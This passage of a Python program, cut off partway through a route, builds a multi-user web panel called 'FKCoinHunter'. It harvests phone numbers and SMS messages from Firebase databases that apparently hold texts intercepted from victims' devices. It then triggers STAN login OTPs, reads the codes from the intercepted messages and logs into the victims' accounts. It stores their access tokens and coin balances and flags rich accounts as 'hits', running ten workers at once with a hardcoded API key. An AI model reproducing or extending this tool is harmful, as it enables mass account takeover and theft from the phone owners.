#!/usr/bin/env python3
"""
FKCoinHunter - Multi-User Web Panel
Each user has private: panels, accounts, hits, logs, and stats
10 Concurrent Workers - Processes ALL numbers in batches of 10
Full Hit System - Save hits, view details, fetch last 5 messages with refresh
Database Cycling - Auto-move to next panel ONLY after ALL numbers processed
"""

import os
import sys
import json
import logging
import threading
import time
import re
import secrets
import base64
import urllib.parse
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Set, Tuple
from dataclasses import dataclass, field
import requests
from flask import Flask, render_template, jsonify, request, send_file, session
from flask_socketio import SocketIO, emit
import queue
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ CONFIG ============
STAN_API_KEY = "af3a3dbe4aeb1af819ce7657b029259324305498164ac0e37c7d614389d8b4d9"
STAN_API_BASE = "https://api.getstan.app"
MIN_FK_BALANCE = 10
HIT_THRESHOLD = 75
OTP_WAIT_SECONDS = 20
OTP_CHECK_INTERVAL = 3
MAX_WORKERS = 10

# ============ FLASK APP ============
app = Flask(__name__)
app.config['SECRET_KEY'] = 'fkcoinhunter-super-secret-key-change-this'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ============ USER DATA MANAGEMENT ============
USER_DATA_DIR = Path("user_data")
USER_DATA_DIR.mkdir(exist_ok=True)

def get_user_id():
    """Get or create unique user ID from session"""
    if 'user_id' not in session:
        session['user_id'] = secrets.token_hex(16)
        session.permanent = True
    return session['user_id']

def get_user_folder(user_id=None):
    """Get user's private folder path"""
    if user_id is None:
        user_id = get_user_id()
    user_folder = USER_DATA_DIR / user_id
    user_folder.mkdir(parents=True, exist_ok=True)
    return user_folder

def load_user_data(user_id, filename):
    """Load user-specific JSON data"""
    path = get_user_folder(user_id) / filename
    if path.exists():
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_user_data(user_id, filename, data):
    """Save user-specific JSON data"""
    path = get_user_folder(user_id) / filename
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# ============ OTP PATTERNS ============
OTP_PATTERNS = [
    {"pattern": r"(\d{4,6})\s+is the otp for mobile verification on STAN", "keyword": "stan", "priority": 1},
    {"pattern": r"STAN.*?OTP[:\s]*(\d{4,6})", "keyword": "stan", "priority": 2},
    {"pattern": r"OTP[:\s]*(\d{4,6}).*?STAN", "keyword": "stan", "priority": 3},
    {"pattern": r"(\d{4,6})\s+is your OTP for STAN", "keyword": "stan", "priority": 4},
]

# ============ ADD CORS HEADERS ============
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# ============ DATA CLASSES ============
@dataclass
class Account:
    phone: str
    access_token: str
    refresh_token: str
    firebase_token: str
    user_id: int
    username: str
    fk_balance: int
    device_uid: str
    user_agent: str
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    saved: bool = False
    device_id: str = ""
    firebase_url: str = ""
    
    def to_dict(self):
        return {
            'phone': self.phone,
            'access_token': self.access_token,
            'refresh_token': self.refresh_token,
            'firebase_token': self.firebase_token,
            'user_id': self.user_id,
            'username': self.username,
            'fk_balance': self.fk_balance,
            'device_uid': self.device_uid,
            'user_agent': self.user_agent,
            'created_at': self.created_at,
            'saved': self.saved,
            'device_id': self.device_id,
            'firebase_url': self.firebase_url
        }

# ============ PARSE PANEL LINK ============
def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
    """Parse Firebase panel link - handles base64 encoded and direct URLs"""
    if "?s=" in link:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if 's' in qs:
            s_param = qs['s'][0]
            s_param += "=" * ((4 - len(s_param) % 4) % 4)
            try:
                decoded = base64.b64decode(s_param).decode('utf-8')
                for sep in ['|||', '|']:
                    if sep in decoded:
                        parts = decoded.split(sep)
                        if len(parts) >= 2:
                            firebase_url = parts[0].strip()
                            api_key = parts[1].strip()
                            if firebase_url and api_key:
                                if not firebase_url.endswith('/'):
                                    firebase_url += '/'
                                return firebase_url, api_key
            except:
                pass
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.endswith('/'):
            link += '/'
        return link, None
    return None

# ============ FETCH PHONES FROM PANEL ============
def fetch_phone_from_device_id(panel: dict, device_id: str) -> Optional[str]:
    url = panel["url"]
    try:
        resp = requests.get(f"{url}clients/{device_id}.json", timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            if data:
                phone = data.get("mobNo") or data.get("phone") or data.get("mobile")
                if phone:
                    phone = re.sub(r'\D', '', phone)
                    if len(phone) == 10 and phone[0] in "6789":
                        return phone
        
        resp = requests.get(f"{url}messages/{device_id}.json", timeout=3)
        if resp.status_code == 200:
            msgs = resp.json() or {}
            for msg in msgs.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                match = re.search(r'\b([6-9]\d{9})\b', text)
                if match:
                    return match.group(1)
        return None
    except:
        return None

def fetch_phones_from_panel(panel: dict, limit: int = 100) -> List[Tuple[str, str]]:
    url = panel["url"]
    try:
        clients_req = requests.get(url + 'clients.json', timeout=5)
        clients = clients_req.json() or {}
    except Exception as e:
        return []

    phones = []
    count = 0
    for c_id, c_data in clients.items():
        if count >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        if not c_data.get("status"):
            continue
        phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile")
        if not phone:
            try:
                msg_resp = requests.get(f"{url}messages/{c_id}.json", timeout=3)
                if msg_resp.status_code == 200:
                    msgs = msg_resp.json() or {}
                    for msg in msgs.values():
                        if not isinstance(msg, dict):
                            continue
                        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                        match = re.search(r'\b([6-9]\d{9})\b', text)
                        if match:
                            phone = match.group(1)
                            break
            except:
                pass
        if phone:
            phone = re.sub(r'\D', '', phone)
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                count += 1
    return phones

# ============ FETCH MESSAGES ============
def fetch_messages_for_device(firebase_url: str, device_id: str) -> List[Dict]:
    if not firebase_url or not device_id:
        return []
    
    try:
        url = f"{firebase_url}messages/{device_id}.json"
        resp = requests.get(url, timeout=5)
        
        if resp.status_code != 200:
            return []
        
        msgs = resp.json()
        if not msgs:
            return []
        
        sorted_msgs = sorted(
            msgs.items(), 
            key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, 
            reverse=True
        )
        
        messages = []
        for msg_id, msg_data in sorted_msgs[:5]:
            if isinstance(msg_data, dict):
                messages.append({
                    'sender': msg_data.get('sender', 'Unknown'),
                    'text': msg_data.get('body') or msg_data.get('message') or msg_data.get('text', ''),
                    'timestamp': msg_id
                })
        
        return messages
    except:
        return []

# ============ POLL OTP ============
def poll_otp_from_panel(firebase_url: str, device_id: str, sender_keyword: str = "STAN", timeout: int = OTP_WAIT_SECONDS) -> Optional[str]:
    start = time.time()
    trigger_time = int(time.time() * 1000)
    
    while time.time() - start < timeout:
        try:
            url = f"{firebase_url}messages/{device_id}.json"
            resp = requests.get(url, timeout=3)
            
            if resp.status_code != 200:
                time.sleep(1)
                continue
            
            msgs = resp.json()
            if not msgs:
                time.sleep(1)
                continue
            
            for msg_id in sorted(msgs.keys(), reverse=True):
                msg_data = msgs[msg_id]
                if not isinstance(msg_data, dict):
                    continue
                
                try:
                    msg_ts = int(msg_id)
                except:
                    continue
                if msg_ts < trigger_time:
                    continue
                
                sender = msg_data.get("sender", "")
                body = msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or ""
                
                if sender_keyword.lower() in sender.lower():
                    for pattern_config in OTP_PATTERNS:
                        pattern = pattern_config["pattern"]
                        keyword = pattern_config["keyword"]
                        
                        if keyword and keyword.lower() not in body.lower():
                            continue
                        
                        match = re.search(pattern, body, re.IGNORECASE)
                        if match:
                            otp = match.group(1)
                            if len(otp) >= 4 and len(otp) <= 6:
                                return otp
                    
                    match = re.search(r'(?<!\d)(\d{4}|\d{6})(?!\d)', body)
                    if match:
                        return match.group(0)
            
            time.sleep(1)
        except:
            time.sleep(1)
    
    return None

# ============ STAN API FUNCTIONS ============
def format_phone(phone):
    phone = re.sub(r'[^0-9+]', '', phone.strip())
    if phone.startswith('+91') and len(phone) == 13:
        return phone
    if phone.startswith('0'):
        phone = phone[1:]
    if phone.startswith('91'):
        return '+' + phone if len(phone) == 12 else '+91' + phone
    if len(phone) == 10:
        return '+91' + phone
    return f"+91{phone[-10:]}" if len(phone) >= 10 else f"+91{phone}"

def send_stan_otp(phone, user_agent):
    url = f"{STAN_API_BASE}/api/v1/auth/otp/store/send"
    headers = {
        "x-api-key": STAN_API_KEY,
        "appversion": "500",
        "platform": "android",
        "user-agent": user_agent,
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://www.stanshop.co",
        "x-requested-with": "mark.via.gp",
    }
    payload = {"phone": phone}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data.get("statusCode") == 10047 or "already" in str(data).lower():
                return {"success": False, "already_registered": True}
            return {"success": True, "data": data}
        return {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def verify_stan_otp(phone, otp, user_agent, device_uuid):
    url = f"{STAN_API_BASE}/api/v4/store/verify/otp"
    payload = {
        "phone": phone,
        "otp": otp,
        "sessionId": None,
        "deviceInfo": {
            "APP_TYPE": "android",
            "DeviceData": {"deviceUID": device_uuid}
        },
        "utmPayload": {},
        "campaignUrl": ""
    }
    
    headers = {
        "x-api-key": STAN_API_KEY,
        "appversion": "500",
        "platform": "android",
        "user-agent": user_agent,
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://www.stanshop.co",
        "x-requested-with": "mark.via.gp",
        "referer": "https://www.stanshop.co/",
    }
    
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=60)
        if response.status_code == 200:
            data = response.json()
            if data.get("access_token"):
                return {
                    'success': True,
                    'access_token': data.get("access_token"),
                    'refresh_token': data.get("refresh_token", ''),
                    'firebase_token': data.get("firebase_token", ''),
                    'user_data': data.get("user", {})
                }
            else:
                if data.get("message") == "Invalid OTP":
                    return {'success': False, 'error': 'Invalid OTP'}
        elif response.status_code == 400:
            return {'success': False, 'error': 'HTTP 400 - Bad Request'}
        return {'success': False, 'error': f'HTTP {response.status_code}'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def get_stan_balance(access_token, user_agent):
    if not access_token:
        return 0
    url = f"{STAN_API_BASE}/api/v1/shop/client/balance?vendor=all"
    headers = {
        "x-api-key": STAN_API_KEY,
        "appversion": "500",
        "platform": "android",
        "user-agent": user_agent,
        "accept": "application/json, text/plain, */*",
        "authorization": f"Bearer {access_token}",
        "countrycode": "IN"
    }
    try:
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data.get("statusCode") == 200:
                return data.get("message", {}).get("fkcoin_balance", 0)
        return 0
    except:
        return 0

# ============ DATABASE MANAGER (Multi-User) ============
class DatabaseManager:
    def __init__(self):
        self.user_id = None
        self.panels = []
        self.current_panel_index = 0
    
    def set_user(self, user_id):
        self.user_id = user_id
        self._load_panels()
    
    def _load_panels(self):
        if not self.user_id:
            self.panels = []
            return
        data = load_user_data(self.user_id, 'panels.json')
        self.panels = data.get('panels', [])
        self.current_panel_index = data.get('current_index', 0)
    
    def _save_panels(self):
        if not self.user_id:
            return
        data = {
            'panels': self.panels,
            'current_index': self.current_panel_index
        }
        save_user_data(self.user_id, 'panels.json', data)
    
    def add_databases(self, urls: List[str]) -> int:
        added = 0
        for url in urls:
            url = url.strip()
            if not url:
                continue
            
            parsed = parse_panel_link(url)
            if not parsed:
                continue
            
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0]
            if not name:
                name = f"Panel_{len(self.panels)+1}"
            
            panel = {
                "name": name,
                "url": firebase_url,
                "api_key": api_key,
                "sender": "STAN"
            }
            
            if panel not in self.panels:
                self.panels.append(panel)
                added += 1
        
        self._save_panels()
        return added
    
    def get_databases(self) -> List[str]:
        return [panel.get('url', '') for panel in self.panels]
    
    def get_current_db(self) -> Optional[str]:
        if self.panels and 0 <= self.current_panel_index < len(self.panels):
            return self.panels[self.current_panel_index].get('url')
        return None
    
    def set_current_db(self, index: int) -> bool:
        if 0 <= index < len(self.panels):
            self.current_panel_index = index
            self._save_panels()
            return True
        return False
    
    def remove_database(self, index: int) -> bool:
        if 0 <= index < len(self.panels):
            self.panels.pop(index)
            if self.current_panel_index >= len(self.panels):
                self.current_panel_index = max(0, len(self.panels) - 1)
            self._save_panels()
            return True
        return False
    
    def get_current_panel(self) -> Optional[Dict]:
        if self.panels and 0 <= self.current_panel_index < len(self.panels):
            return self.panels[self.current_panel_index]
        return None
    
    def get_panels(self) -> List[Dict]:
        return self.panels.copy()
    
    def move_to_next_panel(self) -> bool:
        if not self.panels:
            return False
        next_index = (self.current_panel_index + 1) % len(self.panels)
        return self.set_current_db(next_index)

# ============ HIT MANAGER (Multi-User) ============
class HitManager:
    def __init__(self):
        self.user_id = None
        self.hits: List[Dict] = []
    
    def set_user(self, user_id):
        self.user_id = user_id
        self._load_hits()
    
    def _load_hits(self):
        if not self.user_id:
            self.hits = []
            return
        data = load_user_data(self.user_id, 'hits.json')
        self.hits = data.get('hits', [])
    
    def _save_hits(self):
        if not self.user_id:
            return
        save_user_data(self.user_id, 'hits.json', {'hits': self.hits})
    
    def add_hit(self, account: Account, messages: List[Dict], firebase_url: str, device_id: str) -> bool:
        for hit in self.hits:
            if hit.get('phone') == account.phone:
                return False
        
        hit_data = {
            'phone': account.phone,
            'username': account.username,
            'fk_balance': account.fk_balance,
            'user_id': account.user_id,
            'device_uid': account.device_uid,
            'created_at': account.created_at,
            'access_token': account.access_token[:50] + '...' if account.access_token else '',
            'firebase_url': firebase_url,
            'device_id': device_id,
            'messages': messages or []
        }
        
        self.hits.append(hit_data)
        self._save_hits()
        return True
    
    def get_hits(self) -> List[Dict]:
        return self.hits.copy()
    
    def get_hit(self, index: int) -> Optional[Dict]:
        if 0 <= index < len(self.hits):
            return self.hits[index].copy()
        return None
    
    def get_messages_for_hit(self, index: int) -> List[Dict]:
        hit = self.get_hit(index)
        if not hit:
            return []
        
        firebase_url = hit.get('firebase_url')
        device_id = hit.get('device_id')
        
        if not firebase_url or not device_id:
            return []
        
        return fetch_messages_for_device(firebase_url, device_id)
    
    def refresh_messages_for_hit(self, index: int) -> List[Dict]:
        messages = self.get_messages_for_hit(index)
        if 0 <= index < len(self.hits):
            self.hits[index]['messages'] = messages
            self._save_hits()
        return messages

# ============ ACCOUNT MANAGER (Multi-User) ============
class AccountManager:
    def __init__(self):
        self.user_id = None
        self.accounts: List[Account] = []
        self.processed_numbers: Set[str] = set()
        self.stats = {}
        self.hit_manager = HitManager()
    
    def set_user(self, user_id):
        self.user_id = user_id
        self.hit_manager.set_user(user_id)
        self._load_accounts()
    
    def _load_accounts(self):
        if not self.user_id:
            self.accounts = []
            self.processed_numbers = set()
            self.stats = {}
            return
        data = load_user_data(self.user_id, 'accounts.json')
        account_data = data.get('accounts', [])
        self.accounts = []
        for acc in account_data:
            self.accounts.append(Account(**acc))
        self.processed_numbers = set(data.get('processed', []))
        self.stats = data.get('stats', {
            'total_processed': 0,
            'successful': 0,
            'failed': 0,
            'no_otp': 0,
            'already_registered': 0,
            'skipped': 0,
            'otp_found_stan': 0,
            'otp_found_fallback': 0,
            'total_balance': 0,
            'saved_accounts': 0,
            'hits': 0,
            'http_400_errors': 0
        })
    
    def _save_accounts(self):
        if not self.user_id:
            return
        data = {
            'accounts': [acc.to_dict() for acc in self.accounts],
            'processed': list(self.processed_numbers),
            'stats': self.stats
        }
        save_user_data(self.user_id, 'accounts.json', data)
    
    def add_account(self, account: Account, messages: List[Dict] = None, firebase_url: str = None, device_id: str = None) -> bool:
        for existing in self.accounts:
            if existing.phone == account.phone:
                return False
        
        account.device_id = device_id or ""
        account.firebase_url = firebase_url or ""
        
        self.accounts.append(account)
        self.processed_numbers.add(account.phone)
        self.stats['successful'] = self.stats.get('successful', 0) + 1
        
        if account.fk_balance >= MIN_FK_BALANCE:
            account.saved = True
            self.stats['saved_accounts'] = self.stats.get('saved_accounts', 0) + 1
        
        self.stats['total_balance'] = self.stats.get('total_balance', 0) + account.fk_balance
        
        if account.fk_balance >= HIT_THRESHOLD:
            self.stats['hits'] = self.stats.get('hits', 0) + 1
            self.hit_manager.add_hit(account, messages or [], firebase_url or "", device_id or "")
        
        self._save_accounts()
        return True
    
    def mark_processed(self, phone: str):
        if phone not in self.processed_numbers:
            self.processed_numbers.add(phone)
            self.stats['total_processed'] = self.stats.get('total_processed', 0) + 1
            self._save_accounts()
    
    def mark_failed(self, phone: str, reason: str = 'Unknown'):
        self.stats['failed'] = self.stats.get('failed', 0) + 1
        self._save_accounts()
    
    def mark_no_otp(self, phone: str):
        self.stats['no_otp'] = self.stats.get('no_otp', 0) + 1
        self._save_accounts()
    
    def is_processed(self, phone: str) -> bool:
        return phone in self.processed_numbers
    
    def get_accounts(self) -> List[Dict]:
        return [acc.to_dict() for acc in self.accounts]
    
    def get_stats(self) -> Dict:
        return self.stats.copy()
    
    def get_hits(self) -> List[Dict]:
        return self.hit_manager.get_hits()
    
    def get_hit(self, index: int) -> Optional[Dict]:
        return self.hit_manager.get_hit(index)
    
    def get_messages_for_hit(self, index: int) -> List[Dict]:
        return self.hit_manager.get_messages_for_hit(index)
    
    def refresh_messages_for_hit(self, index: int) -> List[Dict]:
        return self.hit_manager.refresh_messages_for_hit(index)

# ============ GLOBAL STATE ============
auto_status = {
    'running': False,
    'total_processed': 0,
    'successful': 0,
    'failed': 0,
    'no_otp': 0,
    'already_registered': 0,
    'hits': 0,
    'total_balance': 0,
    'current_number': '',
    'current_action': 'Idle',
    'numbers_found': [],
    'recent_accounts': [],
    'recent_hits': [],
    'database_url': '',
    'last_update': datetime.now().isoformat(),
    'processing_logs': [],
    'active_workers': 0,
    'workers_status': {},
    'current_panel': '',
    'panel_index': 0,
    'total_panels': 0
}

# ============ SOCKETIO FUNCTIONS ============
def send_log(message: str, log_type: str = 'info'):
    log_entry = {
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'message': message,
        'type': log_type
    }
    auto_status['processing_logs'].append(log_entry)
    if len(auto_status['processing_logs']) > 500:
        auto_status['processing_logs'] = auto_status['processing_logs'][-500:]
    socketio.emit('new_log', log_entry)

def update_status():
    auto_status['last_update'] = datetime.now().isoformat()
    socketio.emit('status_update', auto_status)

# ============ USER SESSION ============
@app.before_request
def before_request():
    """Initialize user session before each request"""
    user_id = get_user_id()
    account_manager.set_user(user_id)
    database_manager.set_user(user_id)

# ============ SOCKETIO EVENTS ============
@socketio.on('connect')
def handle_connect():
    user_id = get_user_id()
    emit('connected', {'status': 'connected', 'user_id': user_id[:8]})
    emit('status_update', auto_status)
    hits = account_manager.get_hits()
    emit('hits_list', hits)
    for log in auto_status['processing_logs'][-50:]:
        emit('new_log', log)

# ============ AUTOMATION WORKER ============
class AutomationWorker:
    def __init__(self, account_manager: AccountManager, database_manager: DatabaseManager):
        self.account_manager = account_manager
        self.database_manager = database_manager
        self.running = False
        self.thread = None
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.active_workers = 0
        self.worker_lock = threading.Lock()
        self.failed_count = 0
        self.processed_count = 0
        self.user_id = None
    
    def set_user(self, user_id):
        self.user_id = user_id
    
    def start(self):
        if self.running:
            return
        self.running = True
        self.failed_count = 0
        self.processed_count = 0
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        send_log(f"🔄 Automation started with {MAX_WORKERS} concurrent workers", 'success')
        auto_status['running'] = True
        update_status()
    
    def stop(self):
        self.running = False
        if self.executor:
            self.executor.shutdown(wait=False)
        if self.thread:
            self.thread.join(timeout=5)
        send_log("⏹ Automation stopped", 'warning')
        auto_status['running'] = False
        auto_status['active_workers'] = 0
        update_status()
    
    def _move_to_next_panel(self):
        panels = self.database_manager.get_panels()
        if not panels:
            return
        current = self.database_manager.current_panel_index
        next_index = (current + 1) % len(panels)
        if self.database_manager.set_current_db(next_index):
            panel_name = self.database_manager.get_current_panel().get('name', 'Unknown')
            send_log(f"🔄 Switched to Panel {next_index + 1}/{len(panels)}: {panel_name}", 'info')
            auto_status['database_url'] = self.database_manager.get_current_db()
            auto_status['current_panel'] = panel_name
            auto_status['panel_index'] = next_index + 1
            auto_status['total_panels'] = len(panels)
            update_status()
            self.failed_count = 0
            self.processed_count = 0
            return True
        return False
    
    def _run(self):
        """Main worker loop - processes ALL available numbers before moving to next panel"""
        while self.running:
            try:
                # Recreate executor if it was shut down
                if self.executor is None or self.executor._shutdown:
                    self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
                
                panels = self.database_manager.get_panels()
                
                if not panels:
                    send_log("⚠️ No panels available. Please add a Firebase panel.", 'warning')
                    time.sleep(10)
                    continue
                
                # Get current panel
                panel = self.database_manager.get_current_panel()
                
                # If no panel selected or current panel is invalid, select first one
                if not panel or panel not in panels:
                    self.database_manager.set_current_db(0)
                    panel = self.database_manager.get_current_panel()
                    if not panel:
                        time.sleep(5)
                        continue
                
                firebase_url = panel.get("url")
                sender_keyword = panel.get("sender", "STAN")
                panel_index = self.database_manager.current_panel_index
                total_panels = len(panels)
                panel_name = panel.get('name', 'Unknown')
                
                auto_status['current_panel'] = panel_name
                auto_status['panel_index'] = panel_index + 1
                auto_status['total_panels'] = total_panels
                auto_status['database_url'] = firebase_url
                
                send_log(f"📡 Panel {panel_index + 1}/{total_panels}: {panel_name}", 'info')
                
                # Fetch phones from panel
                send_log(f"📡 Fetching devices from {panel_name}...", 'info')
                devices = fetch_phones_from_panel(panel, limit=100)
                
                if not devices:
                    send_log(f"⚠️ No devices found in {panel_name}", 'warning')
                    self._move_to_next_panel()
                    time.sleep(2)
                    continue
                
                send_log(f"📋 Found {len(devices)} active devices in {panel_name}", 'info')
                for phone, device_id in devices[:10]:
                    send_log(f"  📱 {phone} (device: {device_id[:8]}...)", 'info')
                if len(devices) > 10:
                    send_log(f"  ... and {len(devices) - 10} more", 'info')
                
                auto_status['numbers_found'] = [phone for phone, _ in devices]
                
                # Filter already processed
                available = []
                for phone, dev in devices:
                    if not self.account_manager.is_processed(phone):
                        available.append((phone, dev))
                
                if not available:
                    send_log(f"✅ All devices in {panel_name} processed. Moving to next panel...", 'success')
                    self._move_to_next_panel()
                    time.sleep(2)
                    continue
                
                total_available = len(available)
                send_log(f"🆕 Found {total_available} new devices to process in {panel_name}", 'info')
                
                # ============ PROCESS ALL AVAILABLE NUMBERS IN BATCHES ============
                processed_total = 0
                failed_total = 0
                batch_num = 1
                
                while processed_total < total_available and self.running:
                    # Recreate executor if it was shut down
                    if self.executor is None or self.executor._shutdown:
                        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
                    
                    # Get next batch (up to MAX_WORKERS at a time)
                    start_idx = processed_total
                    end_idx = min(processed_total + MAX_WORKERS, total_available)
                    batch = available[start_idx:end_idx]
                    
                    send_log(f"🚀 Batch {batch_num}: Processing {len(batch)} devices (remaining: {total_available - processed_total})", 'info')
                    
                    # Submit batch to thread pool
                    futures = []
                    for phone, device_id in batch:
                        if not self.running:
                            break
                        future = self.executor.submit(
                            self._process_device,
                            phone, device_id, firebase_url, sender_keyword
                        )
                        futures.append(future)
                        auto_status['active_workers'] = len([f for f in futures if not f.done()])
                        update_status()
                    
                    # Wait for ALL tasks in this batch to complete
                    completed = 0
                    batch_success = 0
                    batch_failed = 0
                    
                    for future in as_completed(futures):
                        try:
                            result = future.result(timeout=60)
                            if result:
                                batch_success += 1
                                self.processed_count += 1
                                self.failed_count = 0
                            else:
                                batch_failed += 1
                                self.failed_count += 1
                        except Exception as e:
                            batch_failed += 1
                            self.failed_count += 1
                            send_log(f"❌ Worker error: {str(e)}", 'error')
                        
                        completed += 1
                        processed_total += 1
                        auto_status['active_workers'] = len([f for f in futures if not f.done()])
                        update_status()
                        
                        if completed % 2 == 0 or completed == len(futures):
                            send_log(f"📊 Batch {batch_num} progress: {completed}/{len(futures)} completed ({batch_success} success, {batch_failed} failed)", 'info')
                    
                    batch_num += 1
                    auto_status['active_workers'] = 0
                    update_status()
                    failed_total += batch_failed
                    
                    send_log(f"📊 Batch {batch_num-1} complete: {batch_success} success, {batch_failed} failed", 'info')
                    
                    # If too many failures, break and move to next panel
                    if self.failed_count >= 10:
                        send_log(f"⚠️ Too many failures in {panel_name} ({self.failed_count} consecutive failures). Moving to next panel...", 'warning')
                        break
                    
                    # Small delay between batches
                    if processed_total < total_available:
                        time.sleep(2)
                
                # Report final results for this panel
                send_log(f"📊 Panel {panel_name} complete: {processed_total - failed_total} success, {failed_total} failed out of {total_available}", 'info')
                
                # Move to next panel
                send_log(f"🔄 Moving to next panel...", 'info')
                self._move_to_next_panel()
                auto_status['current_action'] = 'Idle'
                update_status()
                time.sleep(2)
                
            except Exception as e:
                send_log(f"❌ Worker error: {str(e)}", 'error')
                self._move_to_next_panel()
                time.sleep(5)
        
        auto_status['current_action'] = 'Idle'
        with self.worker_lock:
            auto_status['active_workers'] = 0
        update_status()
    
    def _process_device(self, phone: str, device_id: str, firebase_url: str, sender_keyword: str) -> bool:
        if self.account_manager.is_processed(phone):
            return False
        
        self.account_manager.mark_processed(phone)
        
        try:
            formatted = format_phone(phone)
            worker_id = threading.current_thread().name
            send_log(f"[{worker_id}] 📱 Processing: {formatted}", 'info')
            
            user_agent = "Mozilla/5.0 (Linux; Android 14; SM-A065F) AppleWebKit/537.36"
            device_uuid = secrets.token_hex(8)
            
            otp_response = send_stan_otp(formatted, user_agent)
            
            if otp_response.get("already_registered"):
                send_log(f"[{worker_id}] ⚠️ {formatted} - Already registered", 'warning')
                self.account_manager.stats['already_registered'] = self.account_manager.stats.get('already_registered', 0) + 1
                self.account_manager.mark_failed(phone, 'Already registered')
                update_status()
                return False
            
            if not otp_response.get("success"):
                send_log(f"[{worker_id}] ❌ {formatted} - OTP request failed", 'error')
                self.account_manager.mark_failed(phone, 'OTP request failed')
                update_status()
                return False
            
            send_log(f"[{worker_id}] ✅ {formatted} - OTP request sent", 'success')
            send_log(f"[{worker_id}] ⏳ Polling for OTP...", 'info')
            
            otp = poll_otp_from_panel(firebase_url, device_id, sender_keyword, timeout=OTP_WAIT_SECONDS)
            
            if not otp:
                send_log(f"[{worker_id}] ⏰ {formatted} - No OTP received", 'warning')
                self.account_manager.mark_no_otp(phone)
                self.account_manager.mark_failed(phone, 'No OTP')
                update_status()
                return False
            
            send_log(f"[{worker_id}] ✅ OTP found: {otp}", 'success')
            send_log(f"[{worker_id}] 🔐 Verifying OTP...", 'info')
            
            verify_response = verify_stan_otp(formatted, otp, user_agent, device_uuid)
            
            if verify_response.get('success'):
                access_token = verify_response.get('access_token')
                refresh_token = verify_response.get('refresh_token', '')
                firebase_token = verify_response.get('firebase_token', '')
                user_data = verify_response.get('user_data', {})
                username = user_data.get('username', 'User')
                user_id = user_data.get('id', 0)
                
                send_log(f"[{worker_id}] 💰 Fetching balance...", 'info')
                balance = get_stan_balance(access_token, user_agent)
                
                messages = fetch_messages_for_device(firebase_url, device_id)
                
                account = Account(
                    phone=formatted,
                    access_token=access_token,
                    refresh_token=refresh_token,
                    firebase_token=firebase_token,
                    user_id=user_id,
                    username=username,
                    fk_balance=balance,
                    device_uid=device_uuid,
                    user_agent=user_agent,
                    created_at=datetime.now().isoformat(),
                    saved=(balance >= MIN_FK_BALANCE),
                    device_id=device_id,
                    firebase_url=firebase_url
                )
                
                is_hit = balance >= HIT_THRESHOLD
                self.account_manager.add_account(account, messages, firebase_url, device_id)
                
                auto_status['successful'] = self.account_manager.stats.get('successful', 0)
                auto_status['total_balance'] = self.account_manager.stats.get('total_balance', 0)
                auto_status['hits'] = self.account_manager.stats.get('hits', 0)
                
                if is_hit:
                    send_log(f"[{worker_id}] ⭐ HIT! {formatted} | Balance: {balance} FK", 'hit')
                    auto_status['recent_hits'].append({
                        'phone': formatted,
                        'balance': balance,
                        'username': username,
                        'time': datetime.now().strftime('%H:%M:%S')
                    })
                    if len(auto_status['recent_hits']) > 10:
                        auto_status['recent_hits'] = auto_status['recent_hits'][-10:]
                else:
                    send_log(f"[{worker_id}] ✅ SUCCESS! {formatted} | Balance: {balance} FK", 'success')
                
                auto_status['recent_accounts'].append({
                    'phone': formatted,
                    'balance': balance,
                    'username': username,
                    'is_hit': is_hit,
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                if len(auto_status['recent_accounts']) > 20:
                    auto_status['recent_accounts'] = auto_status['recent_accounts'][-20:]
                
                update_status()
                return True
            else:
                error = verify_response.get('error', 'Verification failed')
                send_log(f"[{worker_id}] ❌ {formatted} - Verification failed: {error}", 'error')
                if "400" in error:
                    self.account_manager.stats['http_400_errors'] = self.account_manager.stats.get('http_400_errors', 0) + 1
                self.account_manager.mark_failed(phone, 'Verification failed')
                update_status()
                return False
                
        except Exception as e:
            send_log(f"[{worker_id}] ❌ Error processing {phone}: {str(e)}", 'error')
            self.account_manager.mark_failed(phone, str(e))
            update_status()
            return False

# ============ FLASK ROUTES ============
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def get_status():
    return jsonify(auto_status)

@app.route('/api/stats')
def get_stats():
    return jsonify(account_manager.get_stats())

@app.route('/api/accounts')
def get_accounts():
